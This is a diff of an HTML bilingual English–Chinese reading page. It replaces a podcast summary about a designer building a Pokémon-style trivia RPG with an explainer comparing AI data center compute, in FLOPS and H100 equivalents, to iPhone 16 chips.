-When I released my full podcast transcript archive, <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Ben Shih</strong>, a non-technical designer at <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Miro</strong>, built <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">LennyRPG</strong>: a <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Pokémon-style RPG</strong> where you battle podcast guests with product trivia. In this episode, Ben walks through the exact six-step workflow he used to go from sketch to shipped game, including the tools, prompts, and decisions at every stage, along with the broader lessons he learnt along the way.
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-当我发布了完整的播客文字记录存档后，<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Ben Shih</strong> —— 一位来自 <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Miro</strong> 的非技术背景设计师 —— 打造了 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">LennyRPG</strong>：一款<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">宝可梦风格（Pokémon-style）的角色扮演游戏（RPG）</strong>，你可以用产品知识问答与播客嘉宾进行对战。在本期节目中，Ben 详细讲解了他从草图到上线游戏的精确六步工作流程，包括每个阶段使用的工具、提示词（prompts）和决策，以及他在过程中学到的宏观经验。
-</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">But talking about data centers in terms of dollars spent or power consumed is somewhat abstract: it doesn't tell us much about the sort of capabilities of the infrastructure we're actually building, the way that "miles of track" or "miles of highway" tells us about the <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">scale</strong> of railroad or interstate building. I wanted to get a better understanding of what the data center buildout looks like in terms of computational power.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">但用美元支出或电力消耗来谈论数据中心有些抽象：这并不能告诉我们所建设基础设施的实际能力如何，而"铁路里程"或"公路里程"却能告诉我们铁路或州际公路建设的<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">scale</strong>（规模）。我希望从<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">computational power</strong>（算力）角度更好地理解数据中心的建设规模。</p>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-Listen now: YouTube | Apple | Spotify
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-立即收听：YouTube | Apple | Spotify
-</p>
+<h4 style="margin:24px 0 12px;">AI and computation</h4>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-In this episode, you'll learn:
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-在本期节目中，你将学到：
-</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">By far the biggest drivers of the AI data center buildout are <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">scaling laws</strong>. Briefly, the more data you use to train an AI model, and the bigger and more computationally expensive that model is, the better the model performs. Making better and more powerful AI models thus demands increasing amounts of <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">computation</strong> to train and run them, and data centers are where all that computation is done.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">AI数据中心建设的最大驱动力无疑是<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">scaling laws</strong>（规模法则）。简而言之，用于训练AI模型的数据越多，模型越大、计算成本越高，模型性能就越好。因此，开发更强大、更先进的AI模型需要越来越多的<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">computation</strong>（计算）来训练和运行，而数据中心正是进行所有这些计算的地方。</p>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-<ul style="margin:0;padding-left:20px;"><li>How to have AI interview you instead of writing the <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">PRD</strong> yourself</li></ul>
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-• 如何让 AI 采访你，而不是自己编写<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">产品需求文档（PRD, Product Requirements Document）</strong>
-</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">A common measure of AI model computing power is <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">FLOPS</strong>, floating-point operations per second. <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong>'s GPT-2 model took an estimated 2.3x10^21 FLOP to train, while the more advanced GPT-4 took an estimated 2.1x10^25 FLOP — almost 10,000 times as much computation as GPT-2, more than 20 trillion trillion operations.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">衡量AI模型算力的常用指标是<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">FLOPS</strong>（floating-point operations per second，每秒浮点运算次数）。<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenAI</strong>的GPT-2模型训练需要约2.3×10²¹ FLOP，而更先进的GPT-4则需要约2.1×10²⁵ FLOP——几乎是GPT-2的10,000倍，超过20万亿万亿次运算。</p>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-<ul style="margin:0;padding-left:20px;"><li>How to have AI interview you instead of writing the PRD yourself</li></ul>
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-• 如何让 AI 采访你，而不是自己编写产品需求文档（PRD）
-</p>
+<img src="https://substackcdn.com/image/fetch/$s_!dOxk!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc8556fc2-1736-42af-ade0-f8a54b81a13e_1920x1080.png" alt="Computation comparison chart" style="max-width:100%;border-radius:8px;margin:12px 0;"/>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-<ul style="margin:0;padding-left:20px;"><li>When to pivot your <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">framework</strong>, rather than force the wrong tool</li></ul>
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-• 何时应该更换你的<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">技术框架（framework）</strong>，而不是强行使用错误的工具
-</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">(There is, of course, much more to computer performance than just FLOPS, but it's a useful measure of computing power and it's what we'll stick with here.)</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">（当然，计算机性能不仅仅取决于FLOPS，但它是衡量算力的有用指标，也是本文将采用的标准。）</p>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-<ul style="margin:0;padding-left:20px;"><li>When to pivot your framework, rather than force the wrong tool</li></ul>
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-• 何时应该更换你的技术框架，而不是强行使用错误的工具
-</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">A floating-point operation is exactly what it sounds like: a mathematical operation (addition, subtraction, multiplication, division) performed on floating-point numbers. A floating-point number is a way of digitally representing fraction or decimal numbers in a computer, which stores everything as a sequence of ones and zeroes. It typically has three parts: a <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">sign</strong> (whether the number is positive or negative), and a <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">significand</strong> (some sequence of digits) multiplied by a <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">base</strong> raised to an exponent (which locates the decimal point).</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;"><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">floating-point operation</strong>（浮点运算）顾名思义：是对<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">floating-point numbers</strong>（浮点数）进行的数学运算（加、减、乘、除）。浮点数是计算机中用以数字方式表示分数或小数的方法，计算机将所有数据存储为0和1的序列。它通常包含三个部分：<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">sign</strong>（符号，表示正负）、<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">significand</strong>（有效数字，即某数字序列）以及以<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">base</strong>（基数）的指数次方相乘（用于定位小数点）。</p>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-<ul style="margin:0;padding-left:20px;"><li>How to systematically process 300+ transcripts into game data</li></ul>
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-• 如何系统性地处理 300 多份文字记录，将其转化为游戏数据
-</p>
+<img src="https://substackcdn.com/image/fetch/$s_!TM3X!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe67cd3ab-ae17-4de1-8f65-baf7f7f68a73_280x71.png" alt="Floating point number structure" style="max-width:100%;border-radius:8px;margin:12px 0;"/>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-<ul style="margin:0;padding-left:20px;"><li>How to systematically process 300+ transcripts into game data</li></ul>
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-• 如何系统性地处理 300 多份文字记录，将其转化为游戏数据
-</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Different standards for encoding floating-point numbers in different amounts of memory allocate a different amount of space for each of these parts. For example, the <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">IEEE 754</strong> standard for floating-point arithmetic specifies a 32-bit floating-point number (the size of floating-point numbers typically used in general-purpose computers) as having 1 bit for the sign, 8 bits for the exponent, and 23 bits for the significand. This finite amount of space makes floating-point operations fundamentally limited in their <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">precision</strong>, because the less space you allocate, the less precise your number. A 16-bit floating-point number will have less precision than a 32-bit one, which will have less precision than a 64-bit one. (This will become important later.)</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">不同的标准在编码浮点数时使用不同大小的内存，为各部分分配不同的空间。例如，<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">IEEE 754</strong>标准针对floating-point arithmetic（浮点运算）规定，32位浮点数（通用计算机常用的浮点数大小）包含1位符号位、8位指数位和23位有效数位。这种有限的空间从根本上限制了浮点运算的<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">precision</strong>（精度），因为分配的空间越少，数字精度就越低。16位浮点数的精度低于32位，而32位又低于64位。（这一点后面会变得很重要。）</p>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-<ul style="margin:0;padding-left:20px;"><li>Three core lessons <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Ben</strong> learned from building LennyRPG</li></ul>
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-• <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Ben</strong> 在构建 LennyRPG 过程中学到的三个核心经验
-</p>
+<img src="https://substackcdn.com/image/fetch/$s_!BC0q!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff7070cb3-06d4-4d19-986e-f8b5be9c9837_960x123.png" alt="Precision comparison" style="max-width:100%;border-radius:8px;margin:12px 0;"/>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-<ul style="margin:0;padding-left:20px;"><li>Three core lessons Ben learned from building LennyRPG</li></ul>
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-• Ben 在构建 LennyRPG 过程中学到的三个核心经验
-</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">So how many FLOPS can a typical AI data center achieve?</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">那么，一个典型的AI数据中心能达到多少FLOPS呢？</p>
 
-<h3 style="margin:24px 0 12px;color:#9a9ea6;font-size:16px;">References</h3>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-参考资料
-</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Computation in a data center is done on huge numbers of <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">graphics processing units</strong>, or <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">GPUs</strong>, which are specialized computers designed to perform large numbers of arithmetic operations simultaneously. (GPUs were originally designed to render graphics for things like computer gaming, and for many years <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Nvidia</strong> was primarily a manufacturer of computer gaming graphics cards.) One common GPU is <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Nvidia</strong>'s <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">H100</strong>, which was first released in 2022 and is still one of the most popular GPUs for AI-related computing tasks. Estimates of data center capacity will often be done in terms of "<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">H100 equivalents</strong>." Per Epoch AI's dataset on large GPU clusters, a typical AI data center will have around 100,000 H100 equivalents, and a very large one might have 1 million or more. <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Meta</strong>'s planned 5-gigawatt data center campus in Louisiana is estimated to have over 4 million H100 equivalents when it's complete.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">数据中心的计算是在大量<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">graphics processing units</strong>（图形处理单元，简称<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">GPUs</strong>）上完成的，GPU是专门设计用于同时执行大量算术运算的计算机。（GPU最初用于渲染计算机游戏等图形，多年来<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Nvidia</strong>（英伟达）主要是一家电脑游戏显卡制造商。）一种常见的GPU是<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Nvidia</strong>的<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">H100</strong>，它于2022年首次发布，至今仍是AI相关计算任务中最受欢迎的GPU之一。估算数据中心容量时通常使用"<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">H100 equivalents</strong>"（H100等效数量）作为单位。根据Epoch AI的大型GPU集群数据集，一个典型的AI数据中心拥有约10万个H100等效算力，而非常大的数据中心可能拥有100万或更多。<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Meta</strong>计划在路易斯安那州建设的5千兆瓦（5-gigawatt）数据中心园区预计完工后将拥有超过400万个H100等效算力。</p>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-<ul style="margin:0;padding-left:20px;"><li><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Ben Shih</strong></li></ul>
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-• <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Ben Shih</strong>（本·施）
-</p>
+<img src="https://substackcdn.com/image/fetch/$s_!1xX8!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F59a907d8-bedd-4d60-89f5-3f528a6fd26e_1920x1080.png" alt="GPU cluster visualization" style="max-width:100%;border-radius:8px;margin:12px 0;"/>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-<ul style="margin:0;padding-left:20px;"><li><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Brian Balfour</strong></li></ul>
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-• <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Brian Balfour</strong>（布莱恩·巴尔福）
-</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">How much computational capacity does an H100 have?</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">H100拥有多少计算能力？</p>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-<ul style="margin:0;padding-left:20px;"><li><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Claude Code Awesome Skills marketplace</strong></li></ul>
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-• <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Claude Code Awesome Skills 市场</strong>
-</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">This is where it starts to get complex. GPUs designed for AI tasks, like the H100, are able to perform more computation on <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">less precise</strong> numbers. For a typical 32-bit floating-point number (<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">FP32</strong>), an H100 can do 60–67 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">teraFLOPS</strong> depending on the configuration: up to 67 x 10^12, or 67 trillion, floating-point operations per second. But with 16-bit numbers (<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">FP16</strong>), an H100 can achieve 1,979 teraFLOPS, an increase of almost 30 times. And with 8-bit floating-point numbers (<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">FP8</strong>), it can double that again to 3,958 teraFLOPS.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">这就是问题开始变得复杂的地方。专为AI任务设计的GPU（如H100）能够在<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">less precise</strong>（较低精度）的数字上执行更多计算。对于典型的32位浮点数（<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">FP32</strong>），H100根据配置可以达到60-67 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">teraFLOPS</strong>（万亿次浮点运算每秒）：最高可达67×10¹²，即每秒67万亿次浮点运算。但使用16位数字（<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">FP16</strong>）时，H100可达到1,979 teraFLOPS，性能提升近30倍。而使用8位浮点数（<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">FP8</strong>）时，它可以再次翻倍，达到3,958 teraFLOPS。</p>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-<ul style="margin:0;padding-left:20px;"><li><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">LennysData.com</strong></li></ul>
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-• <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">LennysData.com</strong>
-</p>
+<img src="https://substackcdn.com/image/fetch/$s_!SBPd!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fda743ade-a4b3-4ab5-ad28-d51ec89bc747_557x289.png" alt="H100 performance specifications" style="max-width:100%;border-radius:8px;margin:12px 0;"/>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-<ul style="margin:0;padding-left:20px;"><li><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">LennyRPG</strong></li></ul>
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-• <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">LennyRPG</strong>
-</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">However, outside of FP32 and FP64, these performance levels are achieved with something called <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">sparsity</strong>. Sparsity occurs when for a group of four values in a matrix, at least two of them are zero. When this occurs, the GPU can skip multiplications of the zero values, effectively cutting in half the number of operations it must perform. If the matrix isn't sparse (if the matrix is <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">dense</strong>), the listed performance numbers will fall by roughly half.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">然而，除了FP32和FP64之外，这些性能水平是通过一种称为<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">sparsity</strong>（稀疏性）的技术实现的。当矩阵中一组四个值里至少有两个为零时，就产生了稀疏性。出现这种情况时，GPU可以跳过零值的乘法运算，有效地将必须执行的操作数量减半。如果矩阵不是稀疏的（即矩阵是<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">dense</strong>（稠密）的），列出的性能数字将下降约一半。</p>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-<ul style="margin:0;padding-left:20px;"><li><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Lenny's Product Pass</strong></li></ul>
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-• <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Lenny's Product Pass</strong>（Lenny 的产品通行证）
-</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">When training an AI model, sparsity basically can't be achieved at all. When running a model it can be, but taking advantage of it requires putting the model through an extra step known as <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">pruning</strong>. So only in certain cases can these published H100 performance levels actually be reached.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">在训练AI模型时，基本上完全无法实现稀疏性。在运行（推理）模型时可以实现，但要利用稀疏性需要让模型经过一个称为<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">pruning</strong>（剪枝）的额外步骤。因此，只有在特定情况下才能真正达到H100公布的这些性能水平。</p>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-<ul style="margin:0;padding-left:20px;"><li><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenGameArt.org</strong></li></ul>
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-• <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">OpenGameArt.org</strong>（开源游戏艺术资源网）
-</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">Most general-purpose computing is done using higher-precision FP32 floating-point numbers. But for training and running AI models, it turns out that good results can be achieved with 16-bit, 8-bit, or even 4-bit floating-point numbers.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">大多数通用计算使用较高精度的FP32浮点数完成。但对于训练和运行AI模型，事实证明使用16位、8位甚至4位浮点数也能获得良好的结果。</p>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-<ul style="margin:0;padding-left:20px;"><li><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Phaser 3</strong></li></ul>
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-• <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">Phaser 3</strong>（游戏开发框架）
-</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">How does the computational capacity of an H100 compare to other types of computer, say, an iPhone?</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">H100的计算能力与其他类型的计算机（比如iPhone）相比如何？</p>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-<ul style="margin:0;padding-left:20px;"><li><strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">RPG-JS</strong></li></ul>
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-• <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">RPG-JS</strong>（基于 JavaScript 的 RPG 引擎）
-</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">The iPhone 16 uses <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Apple</strong>'s <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">A18 chip</strong> and features a six-core GPU on the Pro version. Estimates of the computational capacity of the A18 vary, but it seems to be on the order of 2–3 teraFLOPS using FP32, and perhaps double that using FP16. The A18 also has a 16-core <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">neural processing unit</strong> (<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">NPU</strong>) capable of 35 trillion operations per second (TOPS) with what appears to be 8-bit integers (<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">INT8</strong>). By comparison, the H100 can do up to 3,958 TOPS at INT8 with sparsity, an increase of 113 times. (The A18 also has a CPU, but this apparently adds a negligible amount of computational capacity.)</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">iPhone 16使用<strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Apple</strong>（苹果）的<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">A18 chip</strong>（A18芯片），Pro版本配备六核GPU。对A18计算能力的估算各有不同，但使用FP32时似乎约为2-3 teraFLOPS，使用FP16时可能翻倍。A18还配备16核<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">neural processing unit</strong>（神经处理单元，简称<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">NPU</strong>），使用8位整数（<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">INT8</strong>）时可达35万亿次运算每秒（TOPS）。相比之下，H100在INT8格式下利用稀疏性可达到3,958 TOPS，提升了113倍。（A18还有CPU，但这似乎只增加了微不足道的计算能力。）</p>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
-<ul style="margin:0;padding-left:20px;"><li><strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Supabase</strong></li></ul>
-</div>
-<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">
-• <strong style="color:#2471a3;background:#eaf4fd;padding:1px 4px;border-radius:3px;">Supabase</strong>（开源 Firebase 替代方案）
-</p>
+<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">To put this all together: an H100 has 20–30 times the computational capacity of an iPhone 16 GPU when it's doing mathematical operations with 32-bit floating-point numbers, but around 137-275 times the capacity when working with 16-bit numbers (depending on whether you have sparsity or not). And an H100 has around 56-113 times the capacity of the A18's NPU. If we assume that both the NPU and GPU can be used together, this suggests an H100 has on the order of 50-100 times the computational capacity of an iPhone 16.1 A typical AI data center with 100,000 H100 equivalents will be roughly equivalent to 5-10 million iPhone 16s, and a monstrous 5 GW data center will be equivalent to 200-400 million (!) iPhone 16s.</div>
+<p style="color:#2c2c2e;margin:4px 0 24px;line-height:1.8;font-size:15px;">综合来看：在进行32位浮点数数学运算时，<strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">H100</strong>的计算能力是iPhone 16 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">GPU</strong>的20-30倍，但在处理16位数字时，其能力约为后者的137-275倍（取决于是否利用稀疏性）。而H100的计算能力是A18 <strong style="color:#c0392b;background:#fdf2f2;padding:1px 4px;border-radius:3px;">NPU</strong>的约56-113倍。如果我们假设NPU和GPU可以同时使用，这意味着H100的计算能力大约是iPhone 16的50-100倍。一个拥有10万个H100等效算力的典型AI数据中心大致相当于500-1000万台iPhone 16，而一个庞大的5 GW数据中心将相当于2-4亿台（！）iPhone 16。</p>
 
-<div style="color:#9a9ea6;font-size:14px;line-height:1.7;margin:20px 0 6px;">
